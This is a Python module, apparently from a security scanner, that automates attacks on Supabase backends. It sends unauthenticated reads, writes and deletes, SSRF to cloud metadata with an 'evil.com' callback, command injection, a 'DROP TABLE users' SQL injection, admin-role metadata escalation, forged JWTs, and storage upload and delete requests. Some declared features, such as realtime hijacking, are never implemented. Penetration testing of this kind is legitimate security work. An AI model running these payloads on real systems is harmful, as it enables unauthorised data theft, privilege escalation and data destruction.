"""Supabase Deep Testing — deep testing of Row-Level Security, auth, Edge Functions, Storage, and more.

This module tests:
1. RLS policy testing (SELECT/INSERT/UPDATE/DELETE on all tables)
2. Auth settings enumeration (phone_autoconfirm, email_confirm, MFA)
3. Edge Function probing (invoke with/without auth, parameter injection)
4. Storage bucket abuse (list, upload, download, delete)
5. Realtime subscription hijacking (subscribe to tables, intercept data)
6. User metadata escalation (set role:admin in metadata)
7. Service role key detection (check if leaked in client code)
8. JWT manipulation (decode, modify claims, test token refresh)
9. API key abuse (test anon key vs service role key)
10. Database function enumeration (call RPC functions)
"""

from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any

from titan.core.models import AttackType, Finding, Severity


@dataclass
class SupabasePayload:
    """A Supabase-specific test payload."""
    name: str
    category: str
    endpoint: str
    method: str
    payload: Any
    expected_effect: str
    severity: Severity
    confidence: float
    headers: dict[str, str] | None = None


class SupabaseTester:
    """Deep Supabase testing."""

    # ── RLS Policy Testing Payloads ─────────────────────────────────────

    RLS_TEST_PAYLOADS = [
        # Unauthenticated access to tables
        SupabasePayload(
            name="unauthenticated_select",
            category="rls_testing",
            endpoint="/rest/v1/{table}?select=*",
            method="GET",
            payload=None,
            expected_effect="data_exposure",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        SupabasePayload(
            name="unauthenticated_insert",
            category="rls_testing",
            endpoint="/rest/v1/{table}",
            method="POST",
            payload={"data": "test"},
            expected_effect="unauthorized_write",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="unauthenticated_update",
            category="rls_testing",
            endpoint="/rest/v1/{table}?id=eq.1",
            method="PATCH",
            payload={"data": "modified"},
            expected_effect="unauthorized_modify",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="unauthenticated_delete",
            category="rls_testing",
            endpoint="/rest/v1/{table}?id=eq.1",
            method="DELETE",
            payload=None,
            expected_effect="unauthorized_delete",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        # Cross-tenant access
        SupabasePayload(
            name="cross_tenant_select",
            category="rls_testing",
            endpoint="/rest/v1/{table}?user_id=neq.{current_user_id}",
            method="GET",
            payload=None,
            expected_effect="cross_tenant_data",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        # Admin table access
        SupabasePayload(
            name="admin_table_access",
            category="rls_testing",
            endpoint="/rest/v1/admin?select=*",
            method="GET",
            payload=None,
            expected_effect="admin_data_exposure",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="users_table_access",
            category="rls_testing",
            endpoint="/rest/v1/users?select=*",
            method="GET",
            payload=None,
            expected_effect="user_data_exposure",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        SupabasePayload(
            name="auth_users_access",
            category="rls_testing",
            endpoint="/rest/v1/auth.users?select=*",
            method="GET",
            payload=None,
            expected_effect="auth_data_exposure",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
    ]

    # ── Auth Settings Enumeration Payloads ───────────────────────────────

    AUTH_ENUM_PAYLOADS = [
        SupabasePayload(
            name="auth_settings",
            category="auth_enumeration",
            endpoint="/auth/v1/settings",
            method="GET",
            payload=None,
            expected_effect="auth_config_leak",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        SupabasePayload(
            name="auth_signup",
            category="auth_enumeration",
            endpoint="/auth/v1/signup",
            method="POST",
            payload={"email": "test@test.com", "password": "test123"},
            expected_effect="signup_allowed",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        SupabasePayload(
            name="auth_signup_phone",
            category="auth_enumeration",
            endpoint="/auth/v1/signup",
            method="POST",
            payload={"phone": "+1234567890", "password": "test123"},
            expected_effect="phone_signup_allowed",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        SupabasePayload(
            name="auth_admin_users",
            category="auth_enumeration",
            endpoint="/auth/v1/admin/users",
            method="GET",
            payload=None,
            expected_effect="admin_users_leak",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        SupabasePayload(
            name="auth_admin_users_page",
            category="auth_enumeration",
            endpoint="/auth/v1/admin/users?page=1",
            method="GET",
            payload=None,
            expected_effect="admin_users_leak",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        SupabasePayload(
            name="auth_token",
            category="auth_enumeration",
            endpoint="/auth/v1/token?grant_type=password",
            method="POST",
            payload={"email": "test@test.com", "password": "test123"},
            expected_effect="token_endpoint",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        SupabasePayload(
            name="auth Recover",
            category="auth_enumeration",
            endpoint="/auth/v1/recover",
            method="POST",
            payload={"email": "test@test.com"},
            expected_effect="password_recovery",
            severity=Severity.LOW,
            confidence=0.60,
        ),
        SupabasePayload(
            name="auth_user",
            category="auth_enumeration",
            endpoint="/auth/v1/user",
            method="GET",
            payload=None,
            expected_effect="user_endpoint",
            severity=Severity.LOW,
            confidence=0.60,
        ),
    ]

    # ── Edge Function Probing Payloads ──────────────────────────────────

    EDGE_FUNCTION_PAYLOADS = [
        SupabasePayload(
            name="list_functions",
            category="edge_functions",
            endpoint="/functions/v1/",
            method="GET",
            payload=None,
            expected_effect="function_list",
            severity=Severity.MEDIUM,
            confidence=0.75,
        ),
        SupabasePayload(
            name="invoke_without_auth",
            category="edge_functions",
            endpoint="/functions/v1/{function}",
            method="POST",
            payload={},
            expected_effect="unauthorized_invoke",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        SupabasePayload(
            name="invoke_with_anon_key",
            category="edge_functions",
            endpoint="/functions/v1/{function}",
            method="POST",
            payload={},
            headers={"Authorization": "Bearer {anon_key}"},
            expected_effect="anon_invoke",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        SupabasePayload(
            name="parameter_injection",
            category="edge_functions",
            endpoint="/functions/v1/{function}",
            method="POST",
            payload={"__proto__": {"admin": True}, "constructor": {"prototype": {"admin": True}}},
            expected_effect="prototype_pollution",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
        SupabasePayload(
            name="ssrf_via_function",
            category="edge_functions",
            endpoint="/functions/v1/{function}",
            method="POST",
            payload={"url": "http://169.254.169.254/latest/meta-data/", "callback": "http://evil.com"},
            expected_effect="ssrf",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        SupabasePayload(
            name="command_injection",
            category="edge_functions",
            endpoint="/functions/v1/{function}",
            method="POST",
            payload={"input": "; id", "command": "ls -la"},
            expected_effect="command_injection",
            severity=Severity.CRITICAL,
            confidence=0.80,
        ),
    ]

    # ── Storage Bucket Abuse Payloads ───────────────────────────────────

    STORAGE_ABUSE_PAYLOADS = [
        SupabasePayload(
            name="list_buckets",
            category="storage_abuse",
            endpoint="/storage/v1/bucket",
            method="GET",
            payload=None,
            expected_effect="bucket_list",
            severity=Severity.MEDIUM,
            confidence=0.80,
        ),
        SupabasePayload(
            name="list_objects",
            category="storage_abuse",
            endpoint="/storage/v1/object/{bucket}/",
            method="GET",
            payload=None,
            expected_effect="object_list",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        SupabasePayload(
            name="download_object",
            category="storage_abuse",
            endpoint="/storage/v1/object/{bucket}/{path}",
            method="GET",
            payload=None,
            expected_effect="object_download",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        SupabasePayload(
            name="upload_object",
            category="storage_abuse",
            endpoint="/storage/v1/object/{bucket}",
            method="POST",
            payload={"file": "test"},
            expected_effect="unauthorized_upload",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        SupabasePayload(
            name="delete_object",
            category="storage_abuse",
            endpoint="/storage/v1/object/{bucket}/{path}",
            method="DELETE",
            payload=None,
            expected_effect="unauthorized_delete",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        SupabasePayload(
            name="create_bucket",
            category="storage_abuse",
            endpoint="/storage/v1/bucket",
            method="POST",
            payload={"id": "evil-bucket", "name": "evil-bucket"},
            expected_effect="bucket_creation",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        SupabasePayload(
            name="signed_url_generation",
            category="storage_abuse",
            endpoint="/storage/v1/object/sign/{bucket}/{path}",
            method="POST",
            payload={"expiresIn": 31536000},
            expected_effect="signed_url",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
    ]

    # ── Realtime Subscription Hijacking Payloads ────────────────────────

    REALTIME_HIJACK_PAYLOADS = [
        SupabasePayload(
            name="subscribe_all_tables",
            category="realtime_hijack",
            endpoint="/realtime/v1/websocket",
            method="WS",
            payload={"event": "phx_join", "topic": "realtime:*", "payload": {"config": {"broadcast": {"self": True}}}},
            expected_effect="wildcard_subscribe",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="subscribe_admin_table",
            category="realtime_hijack",
            endpoint="/realtime/v1/websocket",
            method="WS",
            payload={"event": "phx_join", "topic": "realtime:admin", "payload": {}},
            expected_effect="admin_table_subscribe",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="subscribe_users_table",
            category="realtime_hijack",
            endpoint="/realtime/v1/websocket",
            method="WS",
            payload={"event": "phx_join", "topic": "realtime:users", "payload": {}},
            expected_effect="users_table_subscribe",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        SupabasePayload(
            name="subscribe_auth_table",
            category="realtime_hijack",
            endpoint="/realtime/v1/websocket",
            method="WS",
            payload={"event": "phx_join", "topic": "realtime:auth.users", "payload": {}},
            expected_effect="auth_table_subscribe",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
    ]

    # ── User Metadata Escalation Payloads ───────────────────────────────

    METADATA_ESCALATION_PAYLOADS = [
        SupabasePayload(
            name="set_admin_role",
            category="metadata_escalation",
            endpoint="/auth/v1/user",
            method="PUT",
            payload={"data": {"role": "admin", "is_admin": True}},
            expected_effect="role_escalation",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="set_superuser_role",
            category="metadata_escalation",
            endpoint="/auth/v1/user",
            method="PUT",
            payload={"data": {"role": "superuser", "is_superuser": True}},
            expected_effect="role_escalation",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="set_admin_permissions",
            category="metadata_escalation",
            endpoint="/auth/v1/user",
            method="PUT",
            payload={"data": {"permissions": ["admin", "superuser", "root"]}},
            expected_effect="permission_escalation",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        SupabasePayload(
            name="set_service_role",
            category="metadata_escalation",
            endpoint="/auth/v1/user",
            method="PUT",
            payload={"data": {"role": "service_role"}},
            expected_effect="service_role_escalation",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
        SupabasePayload(
            name="set_email_verified",
            category="metadata_escalation",
            endpoint="/auth/v1/user",
            method="PUT",
            payload={"data": {"email_verified": True, "phone_verified": True}},
            expected_effect="verification_bypass",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        SupabasePayload(
            name="set_org_id",
            category="metadata_escalation",
            endpoint="/auth/v1/user",
            method="PUT",
            payload={"data": {"org_id": 1, "organization_id": 1}},
            expected_effect="org_escalation",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
    ]

    # ── JWT Manipulation Payloads ───────────────────────────────────────

    JWT_MANIPULATION_PAYLOADS = [
        SupabasePayload(
            name="jwt_decode",
            category="jwt_manipulation",
            endpoint="/auth/v1/user",
            method="GET",
            payload=None,
            headers={"Authorization": "Bearer {decoded_jwt}"},
            expected_effect="jwt_decode",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        SupabasePayload(
            name="jwt_role_claim",
            category="jwt_manipulation",
            endpoint="/rest/v1/{table}",
            method="GET",
            payload=None,
            headers={"Authorization": "Bearer {jwt_with_role_claim}"},
            expected_effect="role_claim_injection",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="jwt_expired_token",
            category="jwt_manipulation",
            endpoint="/rest/v1/{table}",
            method="GET",
            payload=None,
            headers={"Authorization": "Bearer {expired_jwt}"},
            expected_effect="expired_token_accepted",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        SupabasePayload(
            name="jwt_refresh_abuse",
            category="jwt_manipulation",
            endpoint="/auth/v1/token?grant_type=refresh_token",
            method="POST",
            payload={"refresh_token": "{refresh_token}"},
            expected_effect="token_refresh",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        SupabasePayload(
            name="jwt_service_role_key",
            category="jwt_manipulation",
            endpoint="/rest/v1/{table}",
            method="GET",
            payload=None,
            headers={"Authorization": "Bearer {service_role_jwt}"},
            expected_effect="service_role_access",
            severity=Severity.CRITICAL,
            confidence=0.95,
        ),
    ]

    # ── Database Function Enumeration Payloads ──────────────────────────

    DB_FUNCTION_PAYLOADS = [
        SupabasePayload(
            name="rpc_get_public_profiles",
            category="db_functions",
            endpoint="/rest/v1/rpc/get_public_profiles",
            method="POST",
            payload={},
            expected_effect="function_access",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        SupabasePayload(
            name="rpc_get_org_role",
            category="db_functions",
            endpoint="/rest/v1/rpc/get_org_role",
            method="POST",
            payload={"_org_id": 1, "_user_id": 1},
            expected_effect="function_access",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        SupabasePayload(
            name="rpc_admin_only_function",
            category="db_functions",
            endpoint="/rest/v1/rpc/admin_only_function",
            method="POST",
            payload={},
            expected_effect="admin_function_access",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        SupabasePayload(
            name="rpc_sql_injection",
            category="db_functions",
            endpoint="/rest/v1/rpc/{function}",
            method="POST",
            payload={"param": "'; DROP TABLE users--"},
            expected_effect="sql_injection",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        SupabasePayload(
            name="rpc_function_enumeration",
            category="db_functions",
            endpoint="/rest/v1/rpc/",
            method="GET",
            payload=None,
            expected_effect="function_list",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: list[Finding] = []
        self._supabase_url: str | None = None
        self._anon_key: str | None = None
        self._service_role_key: str | None = None

    def set_credentials(
        self,
        supabase_url: str,
        anon_key: str | None = None,
        service_role_key: str | None = None,
    ) -> None:
        """Set Supabase credentials for testing."""
        self._supabase_url = supabase_url
        self._anon_key = anon_key
        self._service_role_key = service_role_key

    async def test_rls_policies(
        self,
        target_url: str,
        tables: list[str],
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test Row-Level Security policies on all tables."""
        findings = []

        for table in tables:
            for payload in self.RLS_TEST_PAYLOADS:
                try:
                    endpoint = payload.endpoint.replace("{table}", table)
                    url = f"{self._supabase_url}{endpoint}"

                    response = await self._send_request(
                        url, payload.method, payload.payload, payload.headers
                    )

                    if response and self._check_rls_bypass(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=payload.method,
                            param=table,
                            location="rest_api",
                            payload=json.dumps(payload.payload) if payload.payload else "",
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                            tags=["baas", "supabase", "rls", payload.name, table],
                            notes=f"RLS bypass: {payload.name} on table '{table}'",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    async def test_auth_enumeration(
        self,
        target_url: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test auth settings enumeration."""
        findings = []

        for payload in self.AUTH_ENUM_PAYLOADS:
            try:
                url = f"{self._supabase_url}{payload.endpoint}"

                response = await self._send_request(
                    url, payload.method, payload.payload, payload.headers
                )

                if response and self._check_auth_enumeration(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=payload.method,
                        param=payload.name,
                        location="auth_api",
                        payload=json.dumps(payload.payload) if payload.payload else "",
                        attack_type=AttackType.INFO_LEAK,
                        severity=payload.severity,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        evidence=response.get("body", "")[:500],
                        tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                        tags=["baas", "supabase", "auth", payload.name],
                        notes=f"Auth enumeration: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_edge_functions(
        self,
        target_url: str,
        functions: list[str],
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test Edge Functions."""
        findings = []

        for function in functions:
            for payload in self.EDGE_FUNCTION_PAYLOADS:
                try:
                    endpoint = payload.endpoint.replace("{function}", function)
                    url = f"{self._supabase_url}{endpoint}"

                    headers = {}
                    if payload.headers:
                        for k, v in payload.headers.items():
                            if "{anon_key}" in v:
                                headers[k] = v.replace("{anon_key}", self._anon_key or "")
                            else:
                                headers[k] = v

                    response = await self._send_request(
                        url, payload.method, payload.payload, headers or None
                    )

                    if response and self._check_edge_function(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=payload.method,
                            param=function,
                            location="edge_function",
                            payload=json.dumps(payload.payload) if payload.payload else "",
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                            tags=["baas", "supabase", "edge_function", payload.name, function],
                            notes=f"Edge function: {payload.name} on '{function}'",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    async def test_storage_abuse(
        self,
        target_url: str,
        buckets: list[str],
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test Storage bucket abuse."""
        findings = []

        for bucket in buckets:
            for payload in self.STORAGE_ABUSE_PAYLOADS:
                try:
                    endpoint = payload.endpoint.replace("{bucket}", bucket)
                    url = f"{self._supabase_url}{endpoint}"

                    response = await self._send_request(
                        url, payload.method, payload.payload, payload.headers
                    )

                    if response and self._check_storage_abuse(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=payload.method,
                            param=bucket,
                            location="storage",
                            payload=json.dumps(payload.payload) if payload.payload else "",
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                            tags=["baas", "supabase", "storage", payload.name, bucket],
                            notes=f"Storage abuse: {payload.name} on bucket '{bucket}'",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    async def test_metadata_escalation(
        self,
        target_url: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test user metadata escalation."""
        findings = []

        for payload in self.METADATA_ESCALATION_PAYLOADS:
            try:
                url = f"{self._supabase_url}{payload.endpoint}"

                response = await self._send_request(
                    url, payload.method, payload.payload, auth_headers
                )

                if response and self._check_metadata_escalation(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=payload.method,
                        param=payload.name,
                        location="auth_api",
                        payload=json.dumps(payload.payload),
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        evidence=response.get("body", "")[:500],
                        tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                        tags=["baas", "supabase", "metadata", payload.name],
                        notes=f"Metadata escalation: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_jwt_manipulation(
        self,
        target_url: str,
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test JWT manipulation."""
        findings = []

        for payload in self.JWT_MANIPULATION_PAYLOADS:
            try:
                url = f"{self._supabase_url}{payload.endpoint}"

                headers = {}
                if payload.headers:
                    for k, v in payload.headers.items():
                        if "{jwt_with_role_claim}" in v:
                            # Generate JWT with role claim
                            headers[k] = self._generate_jwt_with_role("admin")
                        elif "{expired_jwt}" in v:
                            headers[k] = self._generate_expired_jwt()
                        elif "{service_role_jwt}" in v:
                            headers[k] = self._service_role_key or ""
                        elif "{decoded_jwt}" in v:
                            headers[k] = self._anon_key or ""
                        else:
                            headers[k] = v

                response = await self._send_request(
                    url, payload.method, payload.payload, headers or None
                )

                if response and self._check_jwt_manipulation(response, payload):
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=payload.method,
                        param=payload.name,
                        location="jwt",
                        payload=json.dumps(payload.payload) if payload.payload else "",
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=payload.severity,
                        confidence=payload.confidence,
                        status=response.get("status", 0),
                        evidence=response.get("body", "")[:500],
                        tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                        tags=["baas", "supabase", "jwt", payload.name],
                        notes=f"JWT manipulation: {payload.name}",
                    )
                    findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    async def test_db_functions(
        self,
        target_url: str,
        functions: list[str],
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test database function enumeration."""
        findings = []

        for function in functions:
            for payload in self.DB_FUNCTION_PAYLOADS:
                try:
                    endpoint = payload.endpoint.replace("{function}", function)
                    url = f"{self._supabase_url}{endpoint}"

                    response = await self._send_request(
                        url, payload.method, payload.payload, payload.headers
                    )

                    if response and self._check_db_function(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=payload.method,
                            param=function,
                            location="rpc",
                            payload=json.dumps(payload.payload) if payload.payload else "",
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.85 else "suspicious",
                            tags=["baas", "supabase", "db_function", payload.name, function],
                            notes=f"DB function: {payload.name} on '{function}'",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    # ── Helper Methods ──────────────────────────────────────────────────

    async def _send_request(
        self,
        url: str,
        method: str,
        payload: Any,
        headers: dict[str, str] | None = None,
    ) -> dict[str, Any] | None:
        """Send HTTP request and return response."""
        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                req_headers = headers or {}
                if self._anon_key and "Authorization" not in req_headers:
                    req_headers["Authorization"] = f"Bearer {self._anon_key}"
                req_headers["apikey"] = self._anon_key or ""

                if method.upper() == "GET":
                    async with session.get(url, headers=req_headers) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "POST":
                    async with session.post(url, json=payload, headers=req_headers) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "PUT":
                    async with session.put(url, json=payload, headers=req_headers) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "PATCH":
                    async with session.patch(url, json=payload, headers=req_headers) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "DELETE":
                    async with session.delete(url, headers=req_headers) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    def _check_rls_bypass(self, response: dict[str, Any], payload: SupabasePayload) -> bool:
        """Check if RLS was bypassed."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status == 200:
            # Check if data was returned
            if body and body not in ("[]", "{}", "null", ""):
                try:
                    data = json.loads(body)
                    if (isinstance(data, list) and len(data) > 0) or (isinstance(data, dict) and len(data) > 0):
                        return True
                except json.JSONDecodeError:
                    pass

        return False

    def _check_auth_enumeration(self, response: dict[str, Any], payload: SupabasePayload) -> bool:
        """Check if auth enumeration was successful."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status == 200:
            # Check for auth config
            if "phone_autoconfirm" in body or "email_confirm" in body:
                return True
            if "users" in body and "email" in body:
                return True

        return False

    def _check_edge_function(self, response: dict[str, Any], payload: SupabasePayload) -> bool:
        """Check if edge function was accessible."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status == 200:
            # Check for meaningful response
            if body and body not in ("null", ""):
                return True
        elif status == 403:
            # Permission denied but function exists
            if "permission" in body.lower() or "unauthorized" in body.lower():
                return True

        return False

    def _check_storage_abuse(self, response: dict[str, Any], payload: SupabasePayload) -> bool:
        """Check if storage abuse was successful."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status == 200:
            # Check for data
            if body and body not in ("[]", "{}", "null", ""):
                return True

        return False

    def _check_metadata_escalation(self, response: dict[str, Any], payload: SupabasePayload) -> bool:
        """Check if metadata escalation was successful."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status == 200:
            # Check if role was set
            if "admin" in body.lower() or "superuser" in body.lower():
                return True

        return False

    def _check_jwt_manipulation(self, response: dict[str, Any], payload: SupabasePayload) -> bool:
        """Check if JWT manipulation was successful."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status == 200:
            # Check for access
            if body and body not in ("null", ""):
                return True

        return False

    def _check_db_function(self, response: dict[str, Any], payload: SupabasePayload) -> bool:
        """Check if database function was accessible."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status == 200:
            # Check for data
            if body and body not in ("null", ""):
                return True
        elif status == 404:
            # Function doesn't exist
            return False

        return False

    def _generate_jwt_with_role(self, role: str) -> str:
        """Generate a JWT with specified role claim."""
        import base64
        import hashlib
        import hmac

        # Header
        header = json.dumps({"alg": "HS256", "typ": "JWT"})
        header_b64 = base64.urlsafe_b64encode(header.encode()).rstrip(b"=").decode()

        # Payload with role claim
        payload = json.dumps({
            "role": role,
            "aud": "authenticated",
            "exp": 9999999999,
            "sub": "fake-user-id",
            "email": "fake@evil.com",
            "app_metadata": {"provider": "email", "providers": ["email"]},
            "user_metadata": {"role": role},
            "role": role,
        })
        payload_b64 = base64.urlsafe_b64encode(payload.encode()).rstrip(b"=").decode()

        # Signature (using anon key as secret — will likely fail but tests the endpoint)
        signing_input = f"{header_b64}.{payload_b64}"
        secret = (self._anon_key or "fake-secret").encode()
        signature = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()

        return f"{header_b64}.{payload_b64}.{sig_b64}"

    def _generate_expired_jwt(self) -> str:
        """Generate an expired JWT."""
        import base64
        import hashlib
        import hmac

        header = json.dumps({"alg": "HS256", "typ": "JWT"})
        header_b64 = base64.urlsafe_b64encode(header.encode()).rstrip(b"=").decode()

        # Expired timestamp
        payload = json.dumps({
            "role": "authenticated",
            "aud": "authenticated",
            "exp": 1000000000,  # Long expired
            "sub": "fake-user-id",
        })
        payload_b64 = base64.urlsafe_b64encode(payload.encode()).rstrip(b"=").decode()

        signing_input = f"{header_b64}.{payload_b64}"
        secret = (self._anon_key or "fake-secret").encode()
        signature = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()

        return f"{header_b64}.{payload_b64}.{sig_b64}"

    def _generate_jwt_with_claims(self, claims: dict[str, Any]) -> str:
        """Generate a JWT with arbitrary claims."""
        import base64
        import hashlib
        import hmac

        header = json.dumps({"alg": "HS256", "typ": "JWT"})
        header_b64 = base64.urlsafe_b64encode(header.encode()).rstrip(b"=").decode()

        payload = json.dumps({
            "role": "authenticated",
            "aud": "authenticated",
            "exp": 9999999999,
            **claims,
        })
        payload_b64 = base64.urlsafe_b64encode(payload.encode()).rstrip(b"=").decode()

        signing_input = f"{header_b64}.{payload_b64}"
        secret = (self._anon_key or "fake-secret").encode()
        signature = hmac.new(secret, signing_input.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()

        return f"{header_b64}.{payload_b64}.{sig_b64}"

    def get_findings(self) -> list[Finding]:
        """Get all findings from this tester."""
        return self._findings
